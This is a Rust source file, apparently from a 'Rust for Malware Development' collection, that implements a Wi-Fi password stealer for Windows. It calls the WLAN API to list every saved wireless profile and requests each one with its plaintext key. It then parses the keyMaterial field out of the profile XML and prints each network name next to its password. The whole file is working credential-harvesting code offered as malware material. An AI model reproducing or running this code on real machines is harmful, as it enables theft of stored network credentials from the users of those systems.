/*
    Extract Wifi Passwords  
    For More Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    @5mukx
*/

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[!] {}", format!($msg, $($arg), *));   
    }
}

use std::ptr::null_mut;
use std::slice;
use winapi::{ctypes::c_void, shared::winerror::ERROR_SUCCESS};
use winapi::um::wlanapi::*;
use winapi::um::winnt::LPWSTR;
use widestring::U16CString;
use quick_xml::{Reader, events::Event};
use log::{info, error};

fn main() {
    env_logger::init();
    unsafe {
        let mut handle: *mut c_void = null_mut();
        let client_version: u32 = 2;
        let mut negotiated_version: u32 = 0;
        let result = WlanOpenHandle(client_version, null_mut(), &mut negotiated_version, &mut handle);
        if result != ERROR_SUCCESS {
            error!("WlanOpenHandle failed with error: {}", result);
            return;
        }
        info!("WlanOpenHandle succeeded");

        let mut interface_list: *mut WLAN_INTERFACE_INFO_LIST = null_mut();
        let result = WlanEnumInterfaces(handle, null_mut(), &mut interface_list);
        if result != ERROR_SUCCESS {
            error!("WlanEnumInterfaces failed with error: {}", result);
            WlanCloseHandle(handle, null_mut());
            return;
        }
        info!("WlanEnumInterfaces succeeded");

        let interface_list_ref = &*interface_list;
        let interfaces = slice::from_raw_parts(interface_list_ref.InterfaceInfo.as_ptr(), interface_list_ref.dwNumberOfItems as usize);

        for interface in interfaces {
            let interface_guid = &interface.InterfaceGuid;

            let mut profile_list: *mut WLAN_PROFILE_INFO_LIST = null_mut();
            let result = WlanGetProfileList(handle, interface_guid, null_mut(), &mut profile_list);
            if result != ERROR_SUCCESS {
                error!("WlanGetProfileList failed with error: {}", result);
                continue;
            }
            info!("WlanGetProfileList succeeded");

            let profile_list_ref = &*profile_list;
            let profiles = slice::from_raw_parts(profile_list_ref.ProfileInfo.as_ptr(), profile_list_ref.dwNumberOfItems as usize);

            for profile in profiles {
                let profile_name = U16CString::from_ptr_str(profile.strProfileName.as_ptr());

                let mut profile_xml: LPWSTR = null_mut();
                let mut flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                let result = WlanGetProfile(handle, interface_guid, profile_name.as_ptr(), null_mut(), &mut profile_xml, &mut flags, null_mut());
                if result != ERROR_SUCCESS {
                    error!("WlanGetProfile failed with error: {}", result);
                    continue;
                }

                let profile_xml_slice = slice::from_raw_parts(profile_xml, wcslen(profile_xml));
                let profile_xml_string = String::from_utf16_lossy(profile_xml_slice);

                let mut reader = Reader::from_str(&profile_xml_string);
                reader.trim_text(true);
                let mut in_shared_key = false;
                let mut key_material = String::new();

                loop {
                    match reader.read_event() {
                        Ok(Event::Start(ref e)) => {
                            if e.name() == quick_xml::name::QName(b"keyMaterial") {
                                in_shared_key = true;
                            }
                        }
                        Ok(Event::Text(ref e)) if in_shared_key => {
                            key_material = e.escape_ascii().to_string();
                            in_shared_key = false;
                        }
                        Ok(Event::Eof) => break,
                        Err(e) => {
                            error!("Error parsing the XML: {:?}", e);
                            break;
                        }
                        _ => (),
                    }
                }

                if !key_material.is_empty() {
                    println!("NAME: {} | PASSWD: {}", profile_name.to_string_lossy(), key_material);
                } else {
                    println!("NAME: {} | PASSWD NOT FOUND", profile_name.to_string_lossy());
                }
                WlanFreeMemory(profile_xml as *mut _);
            }
            WlanFreeMemory(profile_list as *mut _);
        }

        WlanFreeMemory(interface_list as *mut _);
        WlanCloseHandle(handle, null_mut());
        info!("WlanCloseHandle succeeded");
    }
}

unsafe fn wcslen(mut s: *const u16) -> usize {
    let mut len = 0;
    while *s != 0 {
        len += 1;
        s = s.add(1);
    }
    len
}

